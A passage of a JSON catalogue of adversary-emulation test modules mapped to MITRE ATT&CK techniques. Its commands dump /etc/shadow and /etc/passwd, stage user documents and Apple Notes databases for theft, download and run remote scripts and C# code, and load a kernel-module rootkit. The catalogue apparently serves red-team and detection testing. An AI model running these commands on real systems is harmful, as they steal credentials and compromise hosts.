          "check_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo apt-get -y install libc-bin        \n"
        }
      ],
      "rx_module_id": "a27418de-bdce-4ebd-b655-38f04842bf0c",
      "module_name": "Capture Passwords with MimiPenguin"
    },
    {
      "index": 50,
      "technique_id": "T1003.008",
      "technique_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
      "description": "/etc/shadow file is accessed in Linux environments\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.008.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3723ab77-c546-403c-8fb4-bb577033b235",
      "module_name": "Access /etc/shadow (Local)"
    },
    {
      "index": 51,
      "technique_id": "T1003.008",
      "technique_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
      "description": "/etc/master.passwd file is accessed in FreeBSD environments\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.008.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5076874f-a8e6-4077-8ace-9e5ab54114a5",
      "module_name": "Access /etc/master.passwd (Local)"
    },
    {
      "index": 52,
      "technique_id": "T1003.008",
      "technique_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
      "description": "/etc/passwd file is accessed in FreeBSD and Linux environments\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.008.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "60e860b6-8ae6-49db-ad07-5e73edd88f5d",
      "module_name": "Access /etc/passwd (Local)"
    },
    {
      "index": 53,
      "technique_id": "T1003.008",
      "technique_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
      "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}; fi\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.008.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a",
      "module_name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat"
    },
    {
      "index": 54,
      "technique_id": "T1003.008",
      "technique_name": "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",
      "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
        "elevation_required": true,
        "cleanup_command": "rm -f #{output_file}\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path where captured results will be placed",
          "type": "path",
          "default_value": "/tmp/T1003.008.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f5aa6543-6cb2-4fae-b9c2-b96e14721713",
      "module_name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins"
    },
    {
      "index": 55,
      "technique_id": "T1005",
      "technique_name": "Data from Local System",
      "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$startingDirectory = \"#{starting_directory}\"\n$outputZip = \"#{output_zip_folder_path}\"\n$fileExtensionsString = \"#{file_extensions}\" \n$fileExtensions = $fileExtensionsString -split \", \"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\"\n\n  Write-Host \"Zip file created: $outputZip\\data.zip\"\n  } else {\n      Write-Host \"No files found with the specified extensions.\"\n  }\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path  $outputZip\\data.zip -Force\n"
      },
      "variables": [
        {
          "name": "starting_directory",
          "description": "Path to starting directory for the search",
          "type": "Path",
          "default_value": "C:\\Users"
        },
        {
          "name": "output_zip_folder_path",
          "description": "Path to directory for saving the generated zip file",
          "type": "Path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1005"
        },
        {
          "name": "file_extensions",
          "description": "List of file extensions to be searched and zipped, separated by comma and space",
          "type": "string",
          "default_value": ".doc, .docx, .txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d3d9af44-b8ad-4375-8b0a-4bff4b7e419c",
      "module_name": "Search files of interest and save them to a single zip file (Windows)"
    },
    {
      "index": 56,
      "technique_id": "T1005",
      "technique_name": "Data from Local System",
      "description": "An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;\n",
        "elevation_required": false,
        "cleanup_command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh \n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1005/src"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if running on a Debian based machine.\n",
          "check_command": "if [ -x \"$(command -v sqlite3)\" ]; then echo \"sqlite3 is installed\"; else echo \"sqlite3 is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v strings)\" ]; then echo \"strings is installed\"; else echo \"strings is NOT installed\"; exit 1; fi\n",
          "install_command": "if grep -iq \"debian\\|ubuntu\\|kali\\|mint\" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi\nif grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi\n"
        }
      ],
      "rx_module_id": "00cbb875-7ae4-4cf1-b638-e543fd825300",
      "module_name": "Find and dump sqlite databases (Linux)"
    },
    {
      "index": 57,
      "technique_id": "T1005",
      "technique_name": "Data from Local System",
      "description": "This command will copy Apple Notes database files using AppleScript as seen in RAGLOX Stealer.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e 'tell application \"Finder\"' -e 'set destinationFolderPath to POSIX file \"#{destination_path}\"' -e 'set notesFolderPath to (path to home folder as text) & \"Library:Group Containers:group.com.apple.notes:\"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file \"NoteStore.sqlite\", file \"NoteStore.sqlite-shm\", file \"NoteStore.sqlite-wal\"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",
        "elevation_required": false,
        "cleanup_command": "rm \"#{destination_path}/NoteStore.sqlite*\""
      },
      "variables": [
        {
          "name": "destination_path",
          "description": "Specify the path to copy the database files into.",
          "type": "path",
          "default_value": "/private/tmp"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cfb6d400-a269-4c06-a347-6d88d584d5f7",
      "module_name": "Copy Apple Notes database files using AppleScript"
    },
    {
      "index": 58,
      "technique_id": "T1006",
      "technique_name": "Direct Volume Access",
      "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 R?NTFS\n```",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\#{volume}\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "volume",
          "description": "Drive letter of the volume to access",
          "type": "string",
          "default_value": "C:"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "88f6327e-51ec-4bbf-b2e8-3fea534eab8b",
      "module_name": "Read volume boot sector via DOS device path (PowerShell)"
    },
    {
      "index": 59,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "tasklist.exe /svc\nsc query\nsc query state= all\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "89676ba1-b1f8-47ee-b940-2e1a113ebc71",
      "module_name": "System Service Discovery"
    },
    {
      "index": 60,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net.exe start >> #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "Path of file to hold net.exe output",
          "type": "path",
          "default_value": "%temp%\\service-list.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5f864a3f-8ce9-45c0-812c-bdf7d8aeacc3",
      "module_name": "System Service Discovery - net.exe"
    },
    {
      "index": 61,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates system service using systemctl/service\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f4b26bce-4c2c-46c0-bcc5-fce062d38bef",
      "module_name": "System Service Discovery - systemctl/service"
    },
    {
      "index": 62,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Executes the Get-Service cmdlet to gather objects representing all services on the local system.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "powershell.exe Get-Service",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "51f17016-d8fa-4360-888a-df4bf92c4a04",
      "module_name": "Get-Service Execution"
    },
    {
      "index": 63,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates services on macOS using launchctl. Used by adversaries for\nidentifying daemons, background services, and persistence mechanisms.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "launchctl list",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9b378962-a75e-4856-b117-2503d6dcebba",
      "module_name": "System Service Discovery - macOS launchctl"
    },
    {
      "index": 64,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates scheduled tasks on Windows using schtasks.exe.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "schtasks /query /fo LIST /v",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7cd7eaa3-9ccc-460d-96d2-c6fb13e6d58a",
      "module_name": "System Service Discovery - Windows Scheduled Tasks (schtasks)"
    },
    {
      "index": 65,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates Windows services by reading the Services registry key\n(HKLM\\SYSTEM\\CurrentControlSet\\Services) instead of using Service Control\nManager APIs or CLI tools such as sc.exe or Get-Service.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ChildItem -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services' |\n  ForEach-Object {\n    $p = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue\n    [PSCustomObject]@{\n      Name        = $_.PSChildName\n      DisplayName = $p.DisplayName\n      ImagePath   = $p.ImagePath\n      StartType   = $p.Start\n    }\n  }\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d70d82bd-bb00-4837-b146-b40d025551b2",
      "module_name": "System Service Discovery - Services Registry Enumeration"
    },
    {
      "index": 66,
      "technique_id": "T1007",
      "technique_name": "System Service Discovery",
      "description": "Enumerates system services by listing SysV init scripts and runlevel\nsymlinks under /etc/init.d and /etc/rc*.d.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"[*] Listing SysV init scripts (/etc/init.d):\"\nif [ -d /etc/init.d ]; then ls -l /etc/init.d; else echo \"/etc/init.d not present on this system\"; fi\necho\necho \"[*] Listing runlevel directories (/etc/rc*.d):\"\nls -ld /etc/rc*.d 2>/dev/null || echo \"No /etc/rc*.d directories found\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8f2a5d2b-4018-46d4-8f3f-0fea53754690",
      "module_name": "System Service Discovery - Linux init scripts"
    },
    {
      "index": 67,
      "technique_id": "T1010",
      "technique_name": "Application Window Discovery",
      "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the RAGLOX Threat Library repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:#{output_file_name} \"#{input_source_code}\"\n#{output_file_name}\n",
        "elevation_required": false,
        "cleanup_command": "del /f /q /s #{output_file_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "input_source_code",
          "description": "Path to source of C# code",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1010\\src\\T1010.cs"
        },
        {
          "name": "output_file_name",
          "description": "Name of output binary",
          "type": "string",
          "default_value": "%TEMP%\\T1010.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "T1010.cs must exist on disk at specified location (#{input_source_code})\n",
          "check_command": "if (Test-Path \"#{input_source_code}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{input_source_code}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1010/src/T1010.cs -OutFile \"#{input_source_code}\"\n"
        }
      ],
      "rx_module_id": "fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4",
      "module_name": "List Process Main Windows - C# .NET"
    },
    {
      "index": 68,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8f7578c4-9863-4d83-875c-a565573bbdf0",
      "module_name": "Query Registry"
    },
    {
      "index": 69,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0434d081-bb32-42ce-bcbb-3548e4f2628f",
      "module_name": "Query Registry with Powershell cmdlets"
    },
    {
      "index": 70,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file #{output_file} -append\nwrite-output $($CLSID)| out-file #{output_file} -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append\n$position += 1} catch{}}\n",
        "elevation_required": false,
        "cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\nremove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue      \n"
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to output list of COM objects to",
          "type": "string",
          "default_value": "$env:temp\\T1592.002Test1.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0d80d088-a84c-4353-af1a-fc8b439f1564",
      "module_name": "Enumerate COM Objects in Registry with Powershell"
    },
    {
      "index": 71,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "The reg query commands allows to check the status of the AlwaysInstallElevated registry key for both the user and the machine. If both queries return a value of 0x1, then AlwaysInstallElevated is enabled for both user and machine thus allowing a regular user to install a Microsoft Windows Installer package with system level privileges. This can be abused by an attacker to escalate privileges in the host to SYSTEM level.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated      \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6fb4c4c5-f949-4fd2-8af5-ddbc61595223",
      "module_name": "Reg query for AlwaysInstallElevated status"
    },
    {
      "index": 72,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "Microsoft's Software Inventory Logging (SIL) collects information about software installed per host basis. Adversary can use such logs to passively \ncheck for existence of software of interest to them. Status of SIL can be checked via registry.\n[Reference](https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5c784969-1d43-4ac7-8c3d-ed6d025ed10d",
      "module_name": "Check Software Inventory Logging (SIL) status via Registry"
    },
    {
      "index": 73,
      "technique_id": "T1012",
      "technique_name": "Query Registry",
      "description": "The objective of this test is to query the SystemStartOptions key under HKLM\\SYSTEM\\CurrentControlSet\\Control in the Windows registry. This action could be used to uncover specific details about how the system is configured to start, potentially aiding in understanding boot parameters or identifying security-related settings. key is.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "96257079-cdc1-4aba-8705-3146e94b6dce",
      "module_name": "Inspect SystemStartOptions Value in Registry"
    },
    {
      "index": 74,
      "technique_id": "T1014",
      "technique_name": "Rootkit",
      "description": "Loadable Kernel Module based Rootkit\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko\n",
        "elevation_required": true,
        "cleanup_command": "sudo rmmod #{rootkit_name}\nsudo rm -rf #{rootkit_path}\n"
      },
      "variables": [
        {
          "name": "rootkit_source_path",
          "description": "Path to the rootkit source. Used when prerequisites are fetched.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1014/src/Linux"
        },
        {
          "name": "rootkit_path",
          "description": "Path To rootkit",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1014/bin"
        },
        {
          "name": "rootkit_name",
          "description": "Module name",
          "type": "string",
          "default_value": "T1014"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n",
          "check_command": "if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
          "install_command": "sudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp #{rootkit_source_path}/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir #{rootkit_path}\nmv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko\nrm -rf /tmp/T1014\n"
        }
      ],
      "rx_module_id": "dfb50072-e45a-4c75-a17e-a484809c8553",
      "module_name": "Loadable Kernel Module based Rootkit"
    },
    {
      "index": 75,
      "technique_id": "T1014",
      "technique_name": "Rootkit",
      "description": "Loadable Kernel Module based Rootkit\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo modprobe #{rootkit_name}\n",
        "elevation_required": true,
        "cleanup_command": "sudo modprobe -r #{rootkit_name}\nsudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko\nsudo depmod -a\n"
      },
      "variables": [
        {
          "name": "rootkit_source_path",
          "description": "Path to the rootkit source. Used when prerequisites are fetched.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1014/src/Linux"
        },
        {
          "name": "rootkit_name",
          "description": "Module name",
          "type": "string",
          "default_value": "T1014"
        }
      ],
      "prerequisites": [
        {
          "description": "The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)\n",
          "check_command": "if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;\n",
